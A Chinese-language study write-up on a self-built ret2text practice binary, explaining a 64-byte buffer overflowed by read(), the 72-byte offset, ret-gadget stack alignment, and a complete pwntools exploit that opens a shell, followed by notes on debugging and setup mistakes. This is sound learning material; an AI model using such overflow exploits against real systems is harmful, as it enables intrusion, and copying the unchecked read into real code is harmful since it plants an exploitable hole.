### 题目 2：lab1
说明：这是我自己按源码编译的练习靶场，用于验证 ret2text 原理，不是比赛真题。

题目：一个 64 位程序，main 里调用 vulnerable()，里面有 char buf[64] 和 read(0, buf, 200)；另有一个从未被调用的 backdoor()，内容是 system("/bin/sh")。

编译参数：gcc -fno-stack-protector -no-pie -o lab1 lab1.c

保护情况：Partial RELRO / No canary / NX enabled / No PIE (0x400000)

漏洞位置：read(0, buf, 200) —— 缓冲区只有 64 字节，却允许读入 200 字节，超出部分覆盖到栈上的返回地址。

偏移怎么算出来的：通过0x40可以得出缓冲区有64字节然后因为这是一个64位的程序所以旧的rbp有8个所以返回地址 = 64（buf）+ 8（保存的 rbp）= 72
代码块


sub  rsp, 0x40        → 0x40 = 64
lea  rax, [rbp-0x40]  → buf 就在 rbp-0x40
→ 返回地址 = 64（buf）+ 8（保存的 rbp）= 72

利用思路：

为什么要填 72 个字节？因为要把缓冲区填满并且把rbp覆盖之后才能将返回地址覆盖成backdoor
为什么后面要 p64(ret) 再 p64(backdoor)，直接写 p64(backdoor) 会怎样？64位的Ubuntu下libc要求16字节对齐单独p64（ret）用来抬高rsp完成对齐如果不加ret直接跳backdoor，栈不对齐函数内部调用libc时程序crash
p64() 在做什么？把一个数字（地址）转成8字节、小端格式的bytes二进制串，方便放进payload
关键代码：

python
from pwn import *
elf = ELF('./lab1')
io  = process('./lab1')
offset   = 72
backdoor = elf.symbols['backdoor']
ret      = ROP(elf).find_gadget(['ret'])[0]
payload  = b'A' * offset + p64(ret) + p64(backdoor)
io.send(payload)
io.interactive()
结果：拿到 shell，cat flag.txt 得到 flag{local_lab_ret2text}
踩的坑：栈对齐（system 内部 movaps 崩溃）→ 加一个 ret gadget 空转一步解决

收获：了解了栈溢出的基本做题逻辑和方法

## 四、遇到的困难与解决

- 1、栈对齐导致 exp 崩溃 ）
现象：lab1 的 exp 跑起来直接 SIGSEGV，拿不到 shell
原因：跳进 backdoor 时栈没满足 16 字节对齐，system 内部的 movaps 指令崩溃
解决：在 p64(backdoor) 前面多插一个 ret，空弹一次把 rsp 挪 8 字节
学到：ret2text 不是"跳过去就行"，还要考虑调用约定
- 2、gdb 崩溃后读到的偏移是错的
现象：用 cyclic 在崩溃后读 $rsp-8，算出 62，和预期不符
原因：ret 因跳到非法地址而 fault，此时 rsp 到底有没有递增不可靠
解决：改成在 leave 之前下断点看栈，或者直接从汇编 sub rsp, 0x40 读缓冲区大小
学到：要读某个值，在它被使用之前停下来看，而不是崩溃之后猜
- 3、 apt install 报 Unable to locate package
现象：装 open-vm-tools-desktop 一直失败
原因：apt 索引过期（Reading package lists... Done 只是读了旧索引）
解决：先 sudo apt update，再装就成功了
学到：看到"找不到包"，第一反应应该是刷新索引
- 4、PWN1 一开始以为是 ret2text
现象：看到 system("cat /flag") 就以为是后门函数，想找地址跳过去
原因：没注意它在 if (v2 == 11.28125) 的条件分支里
解决：重新看伪代码，确认要覆盖的是局部变量 v2，不是返回地址
学到：有 system 不等于有后门，要看它在什么条件下才会执行
- 5、命令行"三个世界"搞混
现象：把 mkdir、python3 敲进 gdb；把 Python 代码敲进 bash；把程序输入敲进 bash
原因：分不清自己在哪一层
解决：看提示符 —— $ 结尾是 bash，> 结尾是 gdb/续行；Python 代码要存成 .py 再 python3 跑
学到：先判断自己在哪，比记住命令更重要
